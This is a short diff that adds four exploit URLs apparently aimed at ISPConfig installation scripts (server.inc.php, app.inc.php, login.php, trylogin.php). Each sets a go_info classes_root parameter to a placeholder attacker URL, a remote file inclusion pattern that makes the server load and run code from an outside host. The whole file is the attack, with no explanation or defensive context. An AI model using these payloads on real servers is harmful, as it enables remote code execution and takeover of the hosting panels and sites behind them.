@@ -1,0 +1,4 @@
+http://www.example.com/[ic_path]/install_ispconfig/scripts/lib/server.inc.php?go_info[isp][classes_root]=[cmd_url]/
+http://www.example.com/[ic_path]/install_ispconfig/ispconfig/lib/app.inc.php?go_info[server][classes_root]=[cmd_url]/
+http://www.example.com/[ic_path]/install_ispconfig/ispconfig/web/login/login.php?go_info[server][classes_root]=[cmd_url]/
+http://www.example.com/[ic_path]/install_ispconfig/ispconfig/web/login/trylogin.php?go_info[server][classes_root]=[cmd_url]/
